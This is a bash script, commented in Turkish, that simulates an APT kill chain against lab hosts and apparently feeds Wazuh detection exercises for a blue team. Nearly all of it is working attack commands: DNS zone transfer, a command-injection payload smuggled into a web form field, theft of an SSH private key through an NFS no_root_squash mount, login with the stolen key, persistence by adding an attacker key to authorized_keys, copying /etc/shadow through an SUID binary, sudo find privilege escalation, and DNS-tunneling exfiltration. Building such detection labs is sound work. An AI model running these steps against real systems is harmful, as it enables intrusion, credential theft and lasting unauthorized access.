#!/bin/bash
BLUE_IP="192.168.56.20"
RED_IP="192.168.56.10"
DOMAIN="altay.local"

echo "======================================================"
echo "      ALTAY APT SALDIRI ZINCIRI SIMULASYONU"
echo "======================================================"

# Vektor 1: DNS Zone Transfer (AXFR)
echo -e "\n[*] Vektor 1: DNS Zone Transfer (AXFR) - blue-server hedef: $BLUE_IP"
dig @$BLUE_IP axfr $DOMAIN
sleep 1

# Vektor 2: Web Command Injection (Initial Access)
echo -e "\n[*] Vektor 2: Web Command Injection (Port 8080) Test Ediliyor..."
echo "[*] Injection Islem (whoami & hostname):"
curl -s --data-urlencode "ip=127.0.0.1; echo '---VULN---'; whoami; hostname; echo '---END---'" -X POST http://$RED_IP:8080 | awk '/---VULN---/{flag=1; next} /---END---/{flag=0} flag'
sleep 1

# Vektor 3: NFS no_root_squash & SSH Key Drop
echo -e "\n[*] Vektor 3: NFS Yetkisiz Erisim & SSH Key Calma - red-target hedef: $RED_IP"
mkdir -p /tmp/nfs_mount
# Use sudo to leverage no_root_squash properly and steal the key
if sudo mount -t nfs $RED_IP:/home /tmp/nfs_mount 2>/dev/null; then
  echo "[+] NFS basariyla mount edildi."
  echo "[*] SSH Private Key Kopyalaniyor..."
  sudo cp /tmp/nfs_mount/developer/.ssh/id_rsa /tmp/stolen_key
  sudo chown vagrant:vagrant /tmp/stolen_key
  chmod 600 /tmp/stolen_key
  echo "[+] Anahtar kopyalandi ve izinler ayarlandi."
  sudo umount /tmp/nfs_mount
else
  echo "[!] NFS mount basarisiz oldu - red-target ayakta mi?"
fi
sleep 1

# Vektor 4: SSH Login with Stolen Key
echo -e "\n[*] Vektor 4: Calinan SSH Key ile Sisteme Sizma"
if [ -f "/tmp/stolen_key" ]; then
    ssh -i /tmp/stolen_key -o StrictHostKeyChecking=no developer@$RED_IP "echo '[+] SSH Login OK - Kullanici:' \$(whoami) ' - Hostname:' \$(hostname)"
else
    echo "[-] /tmp/stolen_key bulunamadi, SSH adimina gecilemiyor."
fi
sleep 1

# Kalicilik (Persistence): Authorized Keys
echo -e "\n[*] Post-Exploitation: Sistemde Kalicilik (Persistence) Saglaniyor..."
if [ ! -f ~/.ssh/attacker_key ]; then
    ssh-keygen -t rsa -b 2048 -f ~/.ssh/attacker_key -N "" -q
fi
PUB_KEY=$(cat ~/.ssh/attacker_key.pub)
ssh -i /tmp/stolen_key -o StrictHostKeyChecking=no developer@$RED_IP "echo '$PUB_KEY' >> ~/.ssh/authorized_keys && echo '[+] Attacker Public Key authorized_keys dosyasina eklendi.'"
echo "[+] Ikinci saldirgan (veya yedek erisim) icin kalicilik mekanizmasi kuruldu."
sleep 1

# Vektor 5: SUID Zafiyeti
echo -e "\n[*] Vektor 5: SUID (.hidden_cp) ile /etc/shadow Kopyalama"
ssh -i /tmp/stolen_key -o StrictHostKeyChecking=no developer@$RED_IP \
  "if [ -f /usr/local/bin/.hidden_cp ]; then /usr/local/bin/.hidden_cp /etc/shadow /tmp/shadow_stolen && echo '[+] shadow dosyasi kopyalandi:' && ls -la /tmp/shadow_stolen; else echo '[!] .hidden_cp bulunamadi'; fi"
sleep 1

# Vektor 6: Sudoers find PrivEsc
echo -e "\n[*] Vektor 6: Sudoers 'find' ile Root PrivEsc"
ssh -i /tmp/stolen_key -o StrictHostKeyChecking=no developer@$RED_IP \
  "sudo /usr/bin/find /etc -maxdepth 1 -name 'shadow*' -exec ls -la {} \;"
sleep 1

# Vektor 7: DNS Tunneling Exfiltration
echo -e "\n[*] Vektor 7: DNS Tunneling ile Veri Sizdirma"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
if [ -f "$SCRIPT_DIR/test_exfiltration.sh" ]; then
  "$SCRIPT_DIR/test_exfiltration.sh"
else
  echo "[!] test_exfiltration.sh bulunamadi"
fi

echo ""
echo "======================================================"
echo "[+] APT Kill Chain tamamlandi!"
echo "[*] Wazuh Dashboard: https://$BLUE_IP"
echo "[*] Mavi Takim loglari inceleyebilir."
echo "======================================================"
